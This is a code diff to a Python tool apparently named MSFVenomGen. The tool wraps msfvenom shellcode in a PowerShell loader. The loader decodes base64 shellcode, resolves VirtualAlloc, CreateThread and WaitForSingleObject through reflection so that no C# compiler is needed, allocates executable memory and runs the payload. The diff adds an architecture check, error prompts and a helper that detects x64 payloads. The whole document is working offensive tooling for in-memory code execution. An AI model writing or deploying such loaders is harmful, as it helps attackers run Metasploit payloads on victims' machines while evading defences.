@@ -400,6 +400,16 @@ def build_command(
 PS1_WRAPPER = """\
 # MSFVenomGen - PowerShell shellcode loader
 
+# Architecture guard: ensure PowerShell bitness matches shellcode
+$is64 = [IntPtr]::Size -eq 8
+if ($is64 -ne __IS64__) {
+    $need = if (__IS64__) { '64-bit' } else { '32-bit' }
+    $have = if ($is64) { '64-bit' } else { '32-bit' }
+    Write-Error "Architecture mismatch: shellcode is $need but PowerShell is $have. Re-run with the correct powershell.exe."
+    Read-Host "Press Enter to exit"
+    exit 1
+}
+
 $sc = [Convert]::FromBase64String('__B64__')
 
 # Resolve a function address from a loaded DLL via reflection (no Add-Type / C# compiler needed)
@@ -451,18 +461,34 @@ $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForF
     $WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
 
 $addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
-if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed" }
+if ($addr -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed"
+    Read-Host "Press Enter to exit"
+    exit 1
+}
 
 [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
 
 $thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed" }
+if ($thread -eq [IntPtr]::Zero) {
+    Write-Error "CreateThread failed"
+    Read-Host "Press Enter to exit"
+    exit 1
+}
 
 $WaitForSingleObject.Invoke($thread, 0xFFFFFFFF) | Out-Null
 """
 
 
-def wrap_ps1(raw_path: str, out_path: str) -> bool:
+def arch_from_payload(payload_str: str) -> str:
+    """Return 'x64' if the payload string contains an x64 indicator, else 'x86'."""
+    parts = payload_str.lower().split("/")
+    if "x64" in parts:
+        return "x64"
+    return "x86"
+
+
+def wrap_ps1(raw_path: str, out_path: str, payload_str: str) -> bool:
     """
     Read raw shellcode bytes from raw_path, base64-encode them, and write
     a complete PowerShell loader script to out_path.
@@ -477,7 +503,8 @@ def wrap_ps1(raw_path: str, out_path: str) -> bool:
 
     import base64
     b64 = base64.b64encode(shellcode).decode()
-    ps1 = PS1_WRAPPER.replace("__B64__", b64)
+    is64 = "$true" if arch_from_payload(payload_str) == "x64" else "$false"
+    ps1 = PS1_WRAPPER.replace("__B64__", b64).replace("__IS64__", is64)
 
     try:
         with open(out_path, "w") as f:
@@ -636,7 +663,7 @@ def main():
         if success:
             if is_ps1_wrapped:
                 section("Wrapping shellcode in PowerShell loader")
-                if wrap_ps1(raw_tmp, outfile):
+                if wrap_ps1(raw_tmp, outfile, payload_str):
                     try:
                         os.remove(raw_tmp)
                     except OSError:
